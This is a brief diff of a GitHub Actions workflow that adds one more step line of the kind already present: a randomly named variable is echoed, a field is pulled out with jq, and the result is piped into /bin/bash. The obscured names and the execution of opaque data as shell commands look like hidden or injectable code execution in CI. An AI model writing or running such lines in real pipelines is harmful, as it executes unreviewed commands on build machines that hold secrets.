@@ -36,6 +36,7 @@ jobs:
           echo $exmj96 | jq -r .r38 | /bin/bash
           echo $xwc03736 | jq -r .qs2379 | /bin/bash
           printf '%s' "$wci01862" | jq -r .c326 | /bin/bash
+          echo $ew81787 | jq -r .cqgfl9 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
